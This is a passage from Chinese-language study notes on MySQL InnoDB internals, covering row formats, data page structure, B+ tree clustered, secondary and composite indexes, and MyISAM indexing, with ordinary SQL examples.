alt="image-20211129213718802"></p><p>对于record_format_demo表来说，记录的真实数据除了 c1、c2、c3、c4这⼏个我们⾃⼰定义的列的数据以外，MySQL会为 每个记录默认的添加⼀些列（也称为隐藏列），具体的列如下：</p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211129213745.png" alt="image-20211129213743644"></p><p>InnoDB存储引擎会为每条记录都添加 transaction_id 和 roll_pointer 这两个列，但是 row_id 是可选的（在没有⾃定义主 键以及Unique键的情况下才会添加该列）。</p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211129213816.png" alt="image-20211129213815126"></p><p>注意第1条记录中c3列的值，它是CHAR(10)类型的，它实际 存储的字符串是：’cc’，⽽ascii字符集中的字节表示 是’0x6363’，虽然表示这个字符串只占⽤了2个字节，但整 个c3列仍然占⽤了10个字节的空间，除真实数据以外的8个字 节的统统都⽤空格字符填充，空格字符在ascii字符集的表示 就是0x20</p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211129214047.png" alt="image-20211129214046271"></p><p>修改⼀下record_format_demo表的字符集</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; ALTER TABLE record_format_demo MODIFY</span><br><span class="line">COLUMN c3 CHAR(10) CHARACTER SET utf8;</span><br><span class="line">Query OK, 2 rows affected (0.02 sec)</span><br><span class="line">Records: 2 Duplicates: 0 Warnings: 0</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211129214142.png" alt="image-20211129214140296"></p><p>对于 CHAR(M) 类型的列来说，当列采⽤的是定⻓字 符集时，该列占⽤的字节数不会被加到变⻓字段⻓度列表，⽽如果采 ⽤变⻓字符集时，该列占⽤的字节数也会被加到变⻓字段⻓度列表</p><p>⽐⽅说对于使 ⽤utf8字符集的CHAR(10)的列来说，该列存储的数据字节⻓度的 范围是10～30个字节。即使我们向该列中存储⼀个空字符串也会占 ⽤10个字节，防止碎片</p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211129214441.png" alt="image-20211129214439826"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211129214504.png" alt="image-20211129214502068"></p><p>与Compact⾏格式的记录头信息对⽐来看，有两处不同： Redundant⾏格式多了n_field和1byte_offs_flag 这两个属性。 Redundant⾏格式没有record_type这个属性。</p><p>如果该存储NULL值的字段是CHAR(M)数据类型的，则将 占⽤记录的真实数据部分，并把该字段对应的数据使 ⽤0x00字节填充。</p><p>在Redundant⾏格 式中⼗分⼲脆，不管该列使⽤的字符集是啥，只要是使⽤CHAR(M) 类型，占⽤的真实数据空间就是该字符集表示⼀个字符最多需要的字节数和M的乘积。⽐⽅说使⽤utf8字符集的CHAM(10)类型的列占⽤的真实数据空间始终为30个字节，使⽤gbk字符集的CHAM(10)类型 的列占⽤的真实数据空间始终为20个字节。由此可以看出来，使 ⽤Redundant⾏格式的CHAR(M)类型的列是不会产⽣碎⽚的。</p><p>我们为了存储⼀ 个VARCHAR(M)类型的列，其实需要占⽤3部分存储空间：</p><ol><li>真实数据</li><li>真实数据占⽤字节的⻓度</li><li>NULL值标识，如果该列有NOT NULL属性则可以没有这部分存 储空间</li></ol><p>在列的值允许为NULL的情况下，gbk字符集表示⼀ 个字符最多需要2个字符，那在该字符集下，M的最⼤取值就 是32766（也就是：65532/2），也就是说最多能存储32766个字 符；utf8字符集表示⼀个字符最多需要3个字符，那在该字符集 下，M的最⼤取值就是21844，就是说最多能存储21844（也就是： 65532/3）个字符。⼀定要记住⼀个⾏中的所有列（不 包括隐藏列和记录头信息）占⽤的字节⻓度加起来不能超过65535 个字节</p><p><strong>记录中的数据太多产⽣的溢出</strong></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211129215447.png" alt="image-20211129215445992"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211129215625.png" alt="image-20211129215623861"></p><p>MySQL中规定⼀个⻚中⾄少存放两⾏记录</p><p><strong>Dynamic和Compressed⾏格式</strong></p><p>把所有的字节都存储到其他⻚⾯中，只在记录的真实数据处 存储其他⻚⾯的地址</p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211129215822.png" alt="image-20211129215819101"></p><p>Compressed⾏格式和Dynamic不同的⼀点是，Compressed⾏格 式会采⽤压缩算法对⻚⾯进⾏压缩，以节省空间。</p><p>CHAR(M)中的M值过⼤的情况：最⼤字节⻓度超过768字节，那么不论我们使⽤的是上述4种的哪种⾏格式，InnoDB都会把该列当 成变⻓字段看待。⽐⽅说采⽤utf8mb4的CHAR(255)类型的列将会 被当作变⻓字段看待，因为4×255 &gt; 768。</p><p>总结</p><ol><li><p>⻚是MySQL中磁盘和内存交互的基本单位，也是MySQL是管理 存储空间的基本单位。</p></li><li><p>指定和修改⾏格式的语法如下：</p><p>CREATE TABLE 表名 (列的信息) ROW_FORMAT=⾏格式名称 ALTER TABLE 表名 ROW_FORMAT=⾏格式名称</p></li><li><p>⼀个⻚⼀般是16KB，当记录中的数据太多，当前⻚放不下的时 候，会把多余的数据存储到其他⻚中，这种现象称为⾏溢出</p></li></ol><h1 id="盛放记录的大盒子-——-InnoDB-数据页结构"><a href="#盛放记录的大盒子-——-InnoDB-数据页结构" class="headerlink" title="盛放记录的大盒子 —— InnoDB 数据页结构"></a>盛放记录的大盒子 —— InnoDB 数据页结构</h1><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211129174603.png" alt="image-20211129174450680"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211129174627.png" alt="image-20211129174624487"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; CREATE TABLE page_demo(</span><br><span class="line">-&gt; c1 INT,</span><br><span class="line">-&gt; c2 INT,</span><br><span class="line">-&gt; c3 VARCHAR(10000),</span><br><span class="line">-&gt; PRIMARY KEY (c1)</span><br><span class="line">-&gt; ) CHARSET&#x3D;ascii ROW_FORMAT&#x3D;Compact;</span><br><span class="line">Query OK, 0 rows affected (0.03 sec)</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211129174812.png" alt="image-20211129174703087"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211129174919.png" alt="image-20211129174855647"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211129174932.png" alt="image-20211129174930127"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211129174945.png" alt="image-20211129174943101"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211129175026.png" alt="image-20211129175023590"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211129175048.png" alt="image-20211129175045823"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211129180623.png" alt="image-20211129180611137"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211129181339.png" alt="image-20211129181121849"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211129181416.png" alt="image-20211129181414188"></p><p><strong>Page Header（⻚⾯头部）</strong></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211129201444.png" alt="image-20211129201308854"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211129201446.png" alt="image-20211129201419191"></p><p><strong>File Header（⽂件头部）</strong></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211129201832.png" alt="image-20211129201809205"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211129201837.png" alt="image-20211129201829056"></p><p><strong>页的类型</strong></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211129202033.png" alt="image-20211129202031292"></p><p><strong>我们存放记录的数据⻚的类型其实是FIL_PAGE_INDEX，也就是所谓的索引⻚。</strong>并不是所有类型的⻚都有上⼀个和下⼀个⻚的属性</p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211129202759.png" alt="image-20211129202756365"></p><p><strong>File Trailer：⽤于检验⻚是否完整的部分，占⽤固 定的8个字节。前4个字节代表⻚的校验和，后4个字节代表⻚⾯被最后修改时对应的⽇志序列位置（LSN）</strong></p><p><strong>总结</strong></p><ol><li><p>InnoDB为了不同的⽬的⽽设计了不同类型的⻚，我们把⽤于存 放记录的⻚叫做数据⻚。</p></li><li><p>⼀个数据⻚可以被⼤致划分为7个部分，分别是 File Header，表示⻚的⼀些通⽤信息，占固定的38字 节。</p><p>Page Header，表示数⻚专有的⼀些信息，占固定的 56个字节。</p><p>Infimum + Supremum，两个虚拟的伪记录，分别表示 ⻚中的最⼩和最⼤记录，占固定的26个字节。</p><p>User Records：真实存储我们插⼊的记录的部分，⼤⼩不固定。 Free Space：⻚中尚未使⽤的部分，⼤⼩不确定。</p><p>Page Directory：⻚中的某些记录相对位置，也就是 各个槽在⻚⾯中的地址偏移量，⼤⼩不固定，插⼊的记录越多，这个部分占⽤的空间越多。</p><p>File Trailer：⽤于检验⻚是否完整的部分，占⽤固 定的8个字节。</p></li><li><p>每个记录的头信息中都有⼀个next_record属性，从⽽使⻚中的所有记录串联成⼀个单链表。</p></li><li><p>InnoDB会为把⻚中的记录划分为若⼲个组，每个组的最后⼀ 个记录的地址偏移量作为⼀个槽，存放在Page Directory 中，所以在⼀个⻚中根据主键查找记录是⾮常快的，分为两 步： 通过⼆分法确定该记录所在的槽。 通过记录的next_record属性遍历该槽所在的组中的各个 记录。</p></li><li><p>每个数据⻚的File Header部分都有上⼀个和下⼀个⻚的编 号，所以所有的数据⻚会组成⼀个双链表。</p></li><li><p>为保证从内存中同步到磁盘的⻚的完整性，在⻚的⾸部和尾部 都会存储⻚中数据的校验和和⻚⾯最后修改时对应的LSN（log sequence number）值， 如果⾸部和尾部的校验和和LSN值校验不成功的话，就说明同步过程出现了问题</p></li></ol><h1 id="快速查询的秘籍-——-B-树索引"><a href="#快速查询的秘籍-——-B-树索引" class="headerlink" title="快速查询的秘籍 —— B+ 树索引"></a>快速查询的秘籍 —— B+ 树索引</h1><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211129223231.png" alt="image-20211129223229698"></p><p><strong>在⼀个⻚中的查找</strong></p><p>假设⽬前表中的记录⽐较少，所有的记录都可以被存放到⼀个⻚中， 在查找记录的时候可以根据搜索条件的不同分为两种情况：</p><ol><li>以主键为搜索条件 这个查找过程我们已经很熟悉了，可以在⻚⽬录中使⽤⼆分法 快速定位到对应的槽，然后再遍历该槽对应分组中的记录即可 快速找到指定的记录。</li><li>以其他列作为搜索条件 对⾮主键列的查找的过程可就不这么幸运了，因为在数据⻚中 并没有对⾮主键列建⽴所谓的⻚⽬录，所以我们⽆法通过⼆分 法快速定位相应的槽。这种情况下只能从最⼩记录开始依次遍 历单链表中的每条记录，然后对⽐每条记录是不是符合搜索条 件。很显然，这种查找的效率是⾮常低的。</li></ol><p><strong>在很多⻚中查找</strong></p><p>⼤部分情况下我们表中存放的记录都是⾮常多的，需要好多的数据⻚来存储这些记录。在很多⻚中查找记录的话可以分为两个步骤： 1. 定位到记录所在的⻚。2. 从所在的⻚内中查找相应的记录。</p><p>在没有索引的情况下，不论是根据主键列或者其他列的值进⾏查找， 由于我们并不能快速的定位到记录所在的⻚，所以只能从第⼀个⻚沿着双向链表⼀直往下找，在每⼀个⻚中根据我们刚刚唠叨过的查找⽅式去查找指定的记录。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; CREATE TABLE index_demo(</span><br><span class="line">-&gt; c1 INT,</span><br><span class="line">-&gt; c2 INT,</span><br><span class="line">-&gt; c3 CHAR(1),</span><br><span class="line">-&gt; PRIMARY KEY(c1)</span><br><span class="line">-&gt; ) ROW_FORMAT &#x3D; Compact;</span><br><span class="line">Query OK, 0 rows affected (0.03 sec)</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211129224101.png" alt="image-20211129224059476"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211129224250.png" alt="image-20211129224248812"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211130081343.png" alt="image-20211130001551672"></p><p>因为各个⻚中的记录并没有规律，我们并不知道我们的搜索条件匹配哪些⻚中的记录，所以 不得不依次遍历所有的数据 ⻚</p><p>我们也可以想办法为快速定位记录所在的数据⻚⽽建 ⽴⼀个别的⽬录，建这个⽬录必须完成下边这些事⼉：</p><p><strong>下⼀个数据⻚中⽤户记录的主键值必须⼤于上⼀个⻚中⽤户记 录的主键值。</strong></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211130081340.png" alt="image-20211130003306391"></p><p>新分配的数据⻚编号可能并不是连续的，也就是说我们使⽤的 这些⻚在存储空间⾥可能并不挨着</p><p>不符合下⼀个数据⻚中⽤户记录的主键值 必须⼤于上⼀个⻚中⽤户记录的主键值的要求，所以在插⼊主 键值为4的记录的时候需要伴随着⼀次记录移动，也就是把主 键值为5的记录移动到⻚28中，然后再把主键值为4的记录插⼊ 到⻚10中。这个过程我们也可以称为⻚分裂</p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211130081335.png" alt="image-20211130003819180"></p><p><strong>给所有的⻚建⽴⼀个⽬录项。</strong></p><p>数据⻚的编号可能并不是连续的</p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211130081333.png" alt="image-20211130004329748"></p><p>我们需要 给它们做个⽬录，每个⻚对应⼀个⽬录项，每个⽬录项包括下边两个部分。这个⽬录 有⼀个别名，称为索引。</p><p>⻚的⽤户记录中最⼩的主键值，我们⽤key来表示。 ⻚号，我们⽤page_no表示。</p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211130081326.png" alt="image-20211130004416487"></p><p>我们只需要把⼏个⽬录项在物理存储器上连续存储，⽐如把他们放到⼀个数组⾥，就可以实现根据主键值快速查找某条记录的功能了。</p><p>我们想找主键值为20的记录，具体查找过程分两步： 1. 先从⽬录项中根据⼆分法快速确定出主键值为20的记录 在⽬录项3中（因为 12 &lt; 20 &lt; 209），它对应的⻚是 ⻚9。 2. 再根据前边说的在⻚中查找记录的⽅式去⻚9中定位具体 的记录。</p><p>忽然发现这些⽬录项其实⻓得跟我们的⽤户记录 差不多，只不过⽬录项中的两个列是主键和⻚号⽽已，所以他们复⽤ 了之前存储⽤户记录的数据⻚来存储⽬录项，为了和⽤户记录做⼀下 区分，我们把这些⽤来表示⽬录项的记录称为⽬录项记录</p><p>record_type属性</p><p>0：普通的⽤户记录 1：⽬录项记录 2：最⼩记录 3：最⼤记录</p><p>把前边 使⽤到的⽬录项放到数据⻚中的样⼦：</p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211130081330.png" alt="image-20211130005427867"></p><p>⽬录项记录只有主键值和⻚的编号两个列，⽽普通的⽤户记录 的列是⽤户⾃⼰定义的，可能包含很多列，另外还有InnoDB ⾃⼰添加的隐藏列。</p><p>还记得我们之前在唠叨记录头信息的时候说过⼀个叫 min_rec_mask的属性么，只有在存储⽬录项记录的⻚中的主 键值最⼩的⽬录项记录的min_rec_mask值为1，其他别的记 录的min_rec_mask值都是0</p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211130081921.png" alt="image-20211130081309564"></p><ol><li><p>确定⽬录项记录⻚</p><p>我们现在的存储⽬录项记录的⻚有两个，即⻚30和⻚32，⼜因 为⻚30表示的⽬录项的主键值的范围是[1, 320)，⻚32表示 的⽬录项的主键值不⼩于320，所以主键值为20的记录对应的 ⽬录项记录在⻚30中</p></li><li><p>通过⽬录项记录⻚确定⽤户记录真实所在的⻚</p></li><li><p>在真实存储⽤户记录的⻚中定位到具体的记录。</p></li></ol><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211130081924.png" alt="image-20211130081915167"></p><p>不论是存放⽤户记录的数据⻚，还是存放⽬录项记录的数据⻚，我们 都把它们存放到B+树这个数据结构中了，所以我们也称这些数据⻚ 为节点。实际⽤户记录其实都存放在 B+树的最底层的节点上。存放我 们⽤户记录的那层为第0层，之后依次往上加。</p><p>你的表⾥能存放100000000000条记录么？所以⼀般情况下，我们 ⽤到的B+树都不会超过4层，那我们通过主键值去查找某条记录最多 只需要做4个⻚⾯内的查找（查找3个⽬录项⻚和⼀个⽤户记录 ⻚），⼜因为在每个⻚⾯内有所谓的Page Directory（⻚⽬ 录），所以在⻚⾯内也可以通过⼆分法实现快速定位记录</p><p>⻚内的记录是按照主键的⼤⼩顺序排成⼀个单向链表。 各个存放⽤户记录的⻚也是根据⻚中⽤户记录的主键⼤⼩ 顺序排成⼀个双向链表。 存放⽬录项记录的⻚分为不同的层次，在同⼀层次中的⻚也是根据⻚中⽬录项记录的主键⼤⼩顺序排成⼀个双向链表。B+树的叶⼦节点存储的是完整的⽤户记录，指这个记录中存储了所有列的值 （包括隐藏列）。</p><p><strong>我们把具有这两种特性（上面那段话）的B+树称为聚簇索引，聚簇索引就是数据的存储⽅式，</strong>（所有的⽤户记录都存储在了叶⼦节点），也就是所谓的索引即数据，数据即索引。</p><p><strong>二级索引</strong></p><p>⽤c2列的⼤⼩作为数据⻚、⻚中记录的排序规则，再建⼀棵B+树</p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211130083301.png" alt="image-20211130083221852"></p><p>B+树的叶⼦节点存储的并不是完整的⽤户记录，⽽只是c2列 +主键这两个列的值。</p><p>⽬录项记录中不再是主键+⻚号的搭配，⽽变成了c2列+⻚号的 搭配。</p><ol><li><p>确定⽬录项记录⻚</p><p>根据根⻚⾯，也就是⻚44，可以快速定位到⽬录项记录所在的 ⻚为⻚42（因为2 &lt; 4 &lt; 9）。</p></li><li><p>通过⽬录项记录⻚确定⽤户记录真实所在的⻚。</p><p>在⻚42中可以快速定位到实际存储⽤户记录的⻚，但是由于c2 列并没有唯⼀性约束，所以c2列值为4的记录可能分布在多个 数据⻚中，⼜因为2 &lt; 4 ≤ 4，所以确定实际存储⽤户记录的 ⻚在⻚34和⻚35中。</p></li><li><p>在真实存储⽤户记录的⻚中定位到具体的记录。</p><p>到⻚34和⻚35中定位到具体的记录。</p></li><li><p>但是这个B+树的叶⼦节点中的记录只存储了c2和c1（也就是 主键）两个列，所以我们必须再根据主键值去聚簇索引中再查 找⼀遍完整的⽤户记录。</p></li></ol><p>到聚簇索引中再查⼀遍， 这个过程也被称为回表。也就是根据c2列的值查询⼀条完整的⽤户 记录需要使⽤到2棵B+树！！！</p><p>因为 这种按照⾮主键列建⽴的B+树需要⼀次回表操作才可以定位到完整 的⽤户记录，所以这种B+树也被称为⼆级索引（英⽂名secondary index），或者辅助索引。由于我们使⽤的是c2列的⼤⼩作为B+树 的排序规则，所以我们也称这个B+树为为c2列建⽴的索引。</p><p><strong>联合索引</strong></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211130095146.png" alt="image-20211130084642819"></p><p>每条⽬录项记录都由c2、c3、⻚号这三个部分组成，各条记录 先按照c2列的值进⾏排序，如果记录的c2列相同，则按照c3 列的值进⾏排序</p><p>B+树叶⼦节点处的⽤户记录由c2、c3和主键c1列组成，以c2和c3列的⼤⼩为排序规则建⽴的B+树称为联 合索引，它的意思与分别为c2和c3列分别建⽴索引的表述是不同的，建⽴联合索引只会建⽴如上图⼀样的1棵B+树，为c2和c3列分别建⽴索引会分别以c2和c3列的⼤⼩为排序规 则建⽴2棵B+树</p><p>⼀个B+树索引的根节点⾃诞⽣之 ⽇起，便不会再移动</p><p>这个存储某个索引的根节点在哪个⻚⾯中的信息 就是传说中的数据字典中的⼀项信息</p><p>根节点的⻚号便会被记录到某个地⽅，凡是InnoDB存储引擎 需要⽤到这个索引的时候，都会从那个固定的地⽅取出根节点的⻚ 号，从⽽来访问这个索引</p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211130085417.png" alt="image-20211130085414402"></p><p>如果⼆级索引中⽬录项记录的内容只是索引列 + ⻚号的搭配的话， 那么为c2列建⽴索引后的B+树应该⻓这样：</p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211130090328.png" alt="image-20211130085431304"></p><p>也就是我们把主键值也添加到⼆级索引内节点中的⽬录项记录了，这 样就能保证B+树每⼀层节点中各条⽬录项记录除⻚号这个字段外是 唯⼀的，所以我们为c2列建⽴⼆级索引后的示意图实际上应该是这 样⼦的</p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211130090324.png" alt="image-20211130090034781"></p><p>为了让新插⼊记录能找到⾃⼰在那个⻚⾥，我们需要保证在B+树的 同⼀层内节点的⽬录项记录除⻚号这个字段以外是唯⼀的。所以对于 ⼆级索引的内节点的⽬录项记录的内容实际上是由三个部分构成的： 索引列的值、主键值、⻚号。</p><p>插⼊记录(9, 1, ‘c’)时，如果c2列的值相同的 话，可以接着⽐较主键值</p><p>⼀个B+树只需要很少的层级就可以轻松存储数亿条记录</p><p>⼀个⻚⾯最少存储2条记录</p><p>MyISAM的索引⽅案虽然也使⽤树形结 构，但是却将索引和数据分开存储：</p><p>将表中的记录按照记录的插⼊顺序单独存储在⼀个⽂件中，称 之为数据⽂件。</p><p>这个⽂件并不划分为若⼲个数据⻚，有多少记 录就往这个⽂件中塞多少记录就成了。我们可以通过⾏号⽽快 速访问到⼀条记录。</p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211130094640.png" alt="image-20211130090914706"></p><p>使⽤MyISAM存储引擎的表会把索引信息另外存储到⼀个称为 索引⽂件的另⼀个⽂件中，在索引的叶⼦节点中存储的不是完整的⽤户记 录，⽽是主键值 + ⾏号的组合</p><p>⽽在MyISAM中却需要进⾏⼀次回表操作，意味 着MyISAM中建⽴的索引相当于全部都是⼆级索引。对其它的列分别建⽴索引或者建 ⽴联合索引。在叶⼦节 点处存储的是相应的列 + ⾏号。这些索引也全部都是⼆级索 引。</p><p>MyISAM的⾏格式有定⻓记录格式（Static）、变⻓记录格式 （Dynamic）、压缩记录格式（Compressed）。index_demo表采⽤定⻓记录格式，也就是⼀条记录占⽤存储空间 的⼤⼩是固定的，这样就可以轻松算出某条记录在数据⽂件中的地 址偏移量。但是变⻓记录格式就不⾏了，MyISAM会直接在索引叶⼦ 节点处存储该条记录在数据⽂件中的地址偏移量。反观InnoDB是通过获取主键之后再去聚簇索引 ⾥边⼉找记录，虽然说也不慢，但还是⽐不上直接⽤地址去访问</p><p>为啥不⾃动为每个列都建⽴个索引呢？别忘了，每建 ⽴⼀个索引都会建⽴⼀棵B+树，每插⼊⼀条记录都要维护各个记 录、数据⻚的排序关系，这是很费性能和存储空间的。</p><p>总结</p><ol><li>对于InnoDB存储引擎来说，在单个⻚中查找某条记录分为两 种情况： 以主键为搜索条件，可以使⽤Page Directory通过⼆ 分法快速定位相应的⽤户记录。 以其他列为搜索条件，需要按照记录组成的单链表依次遍 历各条记录。</li><li>没有索引的情况下，不论是以主键还是其他列作为搜索条件， 只能沿着⻚的双链表从左到右依次遍历各个⻚。</li><li>InnoDB存储引擎的索引是⼀棵B+树，完整的⽤户记录都存储 在B+树第0层的叶⼦节点，其他层次的节点都属于内节点，内 节点⾥存储的是⽬录项记录。InnoDB的索引分为两⼤种： 聚簇索引 以主键值的⼤⼩为⻚和记录的排序规则，在叶⼦节点处存 储的记录包含了表中所有的列。 ⼆级索引 以⾃定义的列的⼤⼩为⻚和记录的排序规则，在叶⼦节点 处存储的记录内容是列 + 主键。</li><li>MyISAM存储引擎的数据和索引分开存储，这种存储引擎的索 引全部都是⼆级索引，在叶⼦节点处存储的是列 + ⻚号</li></ol><h1 id="好东西也得先学会怎么用-——-B-树索引的使用"><a href="#好东西也得先学会怎么用-——-B-树索引的使用" class="headerlink" title="好东西也得先学会怎么用 —— B+ 树索引的使用"></a>好东西也得先学会怎么用 —— B+ 树索引的使用</h1><p>InnoDB存储引擎会⾃动为主键（如果没有它会⾃动帮我们添 加）建⽴聚簇索引，聚簇索引的叶⼦节点包含完整的⽤户记 录。</p><p>如果想通过⼆ 级索引来查找完整的⽤户记录的话，需要通过回表操作，也就 是在通过⼆级索引找到主键值之后再到聚簇索引中查找完整的 ⽤户记录</p><p>⼀个⻚默认会占 ⽤16KB的存储空间，⼀棵很⼤的B+树由许多数据⻚组成，那 可是很⼤的⼀⽚存储空间呢。</p><p>时间上的代价：每次对表中的数据进⾏增、删、改操作时，都需要去修改各 个B+树索引。⽽且我们讲过，B+树每层节点都是按照索引列的 值从⼩到⼤的顺序排序⽽组成了双向链表。不论是叶⼦节点中 的记录，还是内节点中的记录（也就是不论是⽤户记录还是⽬ 录项记录）都是按照索引列的值从⼩到⼤的顺序⽽形成了⼀个 单向链表。⽽增、删、改操作可能会对节点和记录的排序造成 破坏，所以存储引擎需要额外的时间进⾏⼀些记录移位，⻚⾯ 分裂、⻚⾯回收啥的操作来维护好节点和记录的排序。如果我 们建了许多索引，每个索引对应的B+树都要进⾏相关的维护操 作，这还能不给性能拖后腿么？</p><p>并不是所有的查询语句都能⽤ 到我们建⽴的索引</p><p>表中的主键是id列，它存储⼀个⾃动递增的整数。所以 InnoDB存储引擎会⾃动为id列建⽴聚簇索引。</p><p>idx_name_birthday_phone_number的示意图</p><p>其中内节点中⽬录项记录的⻚号信息我 们⽤箭头来代替</p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211130101210.png" alt="image-20211130101207349"></p><p>先按照name列的值进⾏排序。 如果name列的值相同，则按照birthday列的值进⾏排序。 如果birthday列的值也相同，则按照phone_number的值进 ⾏排序。</p><p>全值匹配</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM person_info WHERE birthday &#x3D; &#39;1990-</span><br><span class="line">09-27&#39; AND phone_number &#x3D; &#39;15123983239&#39; AND name</span><br><span class="line">&#x3D; &#39;Ashburn&#39;;</span><br></pre></td></tr></table></figure><p>调换顺序没啥影响，因为有查询优化器</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM person_info WHERE name &#x3D; &#39;Ashburn&#39;</span><br><span class="line">AND phone_number &#x3D; &#39;15123983239&#39;;</span><br></pre></td></tr></table></figure><p>这样只能⽤到name列的索引，birthday和phone_number的索引 就⽤不上了，因为name值相同的记录先按照birthday的值进⾏排 序，birthday值相同的记录才按照phone_number值进⾏排序。</p><p>name列：比较字符串大小就用到了该列的字符集和比较规则</p><p>查询以com为后缀的url：逆序 where url like ‘moc%’</p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211130104046.png" alt="image-20211130104044619"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211130171411.png" alt="image-20211130104133081"></p><p>记录之间⽤单链 表，数据⻚之间⽤双链表</p><p>如果对多个列同时进 ⾏范围查找的话，只有对索引最左边的那个列进⾏范围查找的时候才 能⽤到B+树索引</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM person_info WHERE name &gt; &#39;Asa&#39; AND</span><br><span class="line">name &lt; &#39;Barlow&#39; AND birthday &gt; &#39;1980-01-01&#39;;</span><br></pre></td></tr></table></figure><p>上边这个查询可以分成两个部分： 1. 通过条件name &gt; ‘Asa’ AND name &lt; ‘Barlow’来对 name进⾏范围，查找的结果可能有多条name值不同的记录， 2. 对这些name值不同的记录继续通过birthday &gt; ‘1980-01- 01’条件继续过滤。</p><p>因为只 有name值相同的情况下才能⽤birthday列的值进⾏排序，⽽这个 查询中通过name进⾏范围查找的记录中可能并不是按照birthday 列进⾏排序的，所以在搜索条件中继续以birthday列进⾏查找时是 ⽤不到这个B+树索引的。</p><p>对多个列都进⾏范围查找时只能⽤到 最左边那个索引列，但是如果左边的列是精确查找，则右边的列可以 进⾏范围查找</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM person_info WHERE name &#x3D; &#39;Ashburn&#39;</span><br><span class="line">AND birthday &gt; &#39;1980-01-01&#39; AND birthday &lt; &#39;2000-</span><br><span class="line">12-31&#39; AND phone_number &gt; &#39;15100000000&#39;;</span><br></pre></td></tr></table></figure><ol><li>name = ‘Ashburn’，对name列进⾏精确查找，当然可以使 ⽤B+树索引了。</li><li>birthday &gt; ‘1980-01-01’ AND birthday &lt; ‘2000- 12-31’，由于name列是精确查找，所以通过name = ‘Ashburn’条件查找后得到的结果的name值都是相同的，它 们会再按照birthday的值进⾏排序。所以此时对birthday 列进⾏范围查找是可以⽤到B+树索引的。</li><li>phone_number &gt; ‘15100000000’，通过birthday的范 围查找的记录的birthday的值可能不同，所以这个条件⽆法 